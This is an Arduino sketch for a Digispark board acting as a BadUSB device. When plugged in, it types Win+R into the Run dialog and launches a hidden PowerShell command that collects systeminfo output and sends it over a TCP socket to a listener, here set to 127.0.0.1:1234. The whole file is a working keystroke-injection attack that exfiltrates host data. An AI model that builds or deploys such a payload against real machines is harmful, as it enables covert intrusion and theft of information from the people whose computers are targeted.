#include "DigiKeyboard.h"

#define HEADER "PowerShell -WindowStyle Hidden -Command \"& {"

// Attack payload
// Note that this payload shouldn't exceed 213 characters, because the Run window only takes 260 characters.
#define PAYLOAD "try{$i=systeminfo;$e=new-object System.Text.AsciiEncoding;$b=$e.GetBytes($i);$s=new-object System.Net.Sockets.TcpClient('127.0.0.1',1234);$t=$s.GetStream();$t.Write($b,0,$b.Length)}catch{exit}}"

#define TAILER "\""

void setup() {
  //DigiKeyboard.sendKeyStroke(0);// Preventing the ignorence of the first key.

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);// Sending the compose key: Win+R.
  DigiKeyboard.delay(200);// Delay a little bit, make sure the Run window correctly started.

  // Run!
  DigiKeyboard.println(HEADER PAYLOAD TAILER);
}

void loop() {
  while (1)
    DigiKeyboard.update();
}
